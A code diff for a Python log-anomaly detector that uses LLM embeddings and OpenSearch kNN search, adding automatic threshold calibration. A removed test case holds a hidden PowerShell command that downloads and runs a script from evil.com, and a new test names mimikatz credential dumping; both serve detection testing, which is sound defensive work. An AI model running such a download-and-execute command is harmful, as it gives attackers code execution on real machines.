@@ -1,4 +1,7 @@
+# src/detect_anomaly.py
 import os
+import random
+import numpy as np
 from dotenv import load_dotenv
 from opensearchpy import OpenSearch
 from .llm_client import LLMClient
@@ -10,56 +13,208 @@ client = OpenSearch(
     http_compress=True,
     use_ssl=False
 )
+
 index_name = "security-logs-knn"
 
-# 設定異常值
-THRESHOLD = 0.5 
+# ---- kNN 參數 ----
+K = 5                  # 可調整 資料多時可改 20
+CALIB_SAMPLE_N = 200   # 校準 threshold 時抽樣數
+QUANTILE = 0.95        # P95 資料多可改P99
 
-def detect(log_text):
-    print(f"\n🔎 正在分析 Log: '{log_text}'")
 
-    vector = llm.get_embedding(log_text)
-    
-    query = {
-        "size": 1,
-        "query": {
-            "knn": {
-                "log_vector": {
-                    "vector": vector,
-                    "k": 1
-                }
+def _build_knn_query(query_vector, k=K, size=K, filters=None, exclude_id=None):
+    """
+    建立 kNN 查詢 + 可選 filter + 可選排除某 doc（避免自比對）
+    """
+    knn_part = {
+        "knn": {
+            "log_vector": {
+                "vector": query_vector,
+                "k": k
             }
         }
     }
-    
-    response = client.search(index=index_name, body=query)
-    
-    if response["hits"]["hits"]:
-        match = response["hits"]["hits"][0]
-        score = match["_score"]
 
-        l2_distance = (1 / score) - 1
+    # 排除自己那筆 baseline
+    must_not = []
+    if exclude_id:
+        must_not.append({"ids": {"values": [exclude_id]}})
+
+    if filters:
+        return {
+            "size": size,
+            "query": {
+                "bool": {
+                    "filter": [{"term": {k: v}} for k, v in filters.items()],
+                    "must": knn_part,
+                    "must_not": must_not
+                }
+            }
+        }
+
+    if must_not:
+        return {
+            "size": size,
+            "query": {
+                "bool": {
+                    "must": knn_part,
+                    "must_not": must_not
+                }
+            }
+        }
+
+    return {"size": size, "query": knn_part}
+
+
+def _anomaly_score_from_hits(hits, k=K, method="kth"):
+    """
+    計算異常分數
+    method:
+      - "kth": score = 1 - sim_k
+      - "avg": score = 1 - avg_sim_topk
+    """
+    if not hits:
+        return None
+
+    sims = sorted([h["_score"] for h in hits], reverse=True)  # 越大越像
+    
+    if method == "avg":
+        sim = float(np.mean(sims))
+    elif method == "max":
+        sim = float(sims[0])
+    else:  # "kth" (Default)
+        # 取第 k 個鄰居
+        idx = min(k - 1, len(sims) - 1)
+        sim = float(sims[idx])
+
+    return 1.0 - sim  # 越大越異常
+
+
+def calibrate_threshold(sample_n=CALIB_SAMPLE_N, k=K, quantile=QUANTILE,
+                        filters=None, score_method="kth", seed=42):
+    """
+    從 baseline 抽樣 N 筆，計算建議的 threshold
+    """
+    random.seed(seed)
+    print(f"\n   正在進行自動校正 (Calibration)...")
+
+    #    抓取 baseline 文件的 ID 和向量
+    try:
+        random_query = {
+            "size": sample_n,
+            "query": {
+                "function_score": {
+                    "query": {"match_all": {}},
+                    "random_score": {}
+                }
+            },
+            "_source": ["log_vector"]
+        }
         
-        print(f"   -> 最相似的歷史紀錄: {match['_source']['log_text']}")
-        print(f"   -> 差異距離 (L2 Distance): {l2_distance:.4f}")
+        if filters:
+            random_query["query"]["function_score"]["query"] = {
+                "bool": {"filter": [{"term": {k: v}} for k, v in filters.items()]}
+            }
+
+        resp = client.search(index=index_name, body=random_query)
+        hits = resp.get("hits", {}).get("hits", [])
+    
+    except Exception as e:
+        print(f"   校正失敗 (無法取得樣本): {e}")
+        return None
+
+    if len(hits) < max(5, k + 1):
+        print(f"   資料筆數不足 ({len(hits)} < {k+1})，無法進行統計校正。")
+        return None
+
+    scores = []
+
+    # 對每個樣本做 kNN
+    for doc in hits:
+        doc_id = doc["_id"]
+        vector = doc["_source"].get("log_vector")
         
-        if l2_distance > THRESHOLD:
-            print(f"     [警告] 距離過大 (> {THRESHOLD})！判定為【異常行為】")
-            print("   (這條 Log 跟我們已知的正常行為差異太大，可能是攻擊！)")
-        else:
-            print(f"     [正常] 距離在安全範圍內。")
+        if not vector: continue
+
+        knn_query = _build_knn_query(
+            query_vector=vector,
+            k=k,
+            size=k,
+            filters=filters,
+            exclude_id=doc_id
+        )
+
+        try:
+            nn = client.search(index=index_name, body=knn_query)
+            neighbors = nn.get("hits", {}).get("hits", [])
+            
+            s = _anomaly_score_from_hits(neighbors, k=k, method=score_method)
+            if s is not None:
+                scores.append(s)
+        except Exception:
+            continue
+
+    if not scores:
+        return None
+
+    #    計算分位數
+    threshold = float(np.quantile(scores, quantile))
+    
+    print(f"  校正完成: Method={score_method}, K={k}, P{int(quantile*100)}={threshold:.4f}, Samples={len(scores)}")
+    return threshold
+
+
+def detect(log_text, threshold, k=K, filters=None, score_method="kth", print_top=5):
+    print(f"\n  正在分析 Log: '{log_text}'")
+
+    # 這裡 call LLM，因為是新進來的未知 Log
+    try:
+        vector = llm.get_embedding(log_text)
+    except Exception as e:
+        print(f"  Embedding 失敗: {e}")
+        return
+
+    query = _build_knn_query(query_vector=vector, k=k, size=k, filters=filters)
+    
+    try:
+        response = client.search(index=index_name, body=query)
+    except Exception as e:
+        print(f"  搜尋失敗: {e}")
+        return
+
+    hits = response.get("hits", {}).get("hits", [])
+
+    if not hits:
+        print("      無可比對資料（資料庫空或 filter 後無結果）。")
+        return
+
+    anomaly_score = _anomaly_score_from_hits(hits, k=k, method=score_method)
+    
+    print("   -> Top neighbors:")
+    for i, h in enumerate(hits[:print_top], 1):
+        txt = h["_source"].get("log_text", "")
+        print(f"      {i}. sim={h['_score']:.4f} | {txt[:60]}...")
+
+    print(f"   -> anomaly_score ({score_method}) = {anomaly_score:.4f}")
+    print(f"   -> threshold (P{int(QUANTILE*100)}) = {threshold:.4f}")
+
+    if anomaly_score > threshold:
+        print(f"🔴 [異常 DETECTED] Score {anomaly_score:.4f} > {threshold:.4f}")
     else:
-        print("     資料庫是空的，無法比對。")
+        print(f"🟢 [正常 BENIGN] Score {anomaly_score:.4f} <= {threshold:.4f}")
 
-def main():
-
-    # case A: 看起來很正常的 Log 
-    normal_test = "User david logged in successfully from IP 10.0.0.1 via VPN."
-    detect(normal_test)
-    
-    # case B: 明顯的攻擊語法 
-    malicious_test = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1')"
-    detect(malicious_test)
 
 if __name__ == "__main__":
-    main()
+    # 自動校正
+    threshold = calibrate_threshold(score_method="kth")
+    if threshold is None:
+        threshold = 0.35 
+        print(f"   使用預設閾值: {threshold}")
+
+    # test case 1: 正常
+    normal_test = "User admin logged in successfully from 192.168.1.5"
+    detect(normal_test, threshold=threshold)
+
+    # test case 2: 攻擊
+    malicious_test = "Suspicious process mimikatz.exe dumping credentials from lsass.exe"
+    detect(malicious_test, threshold=threshold)
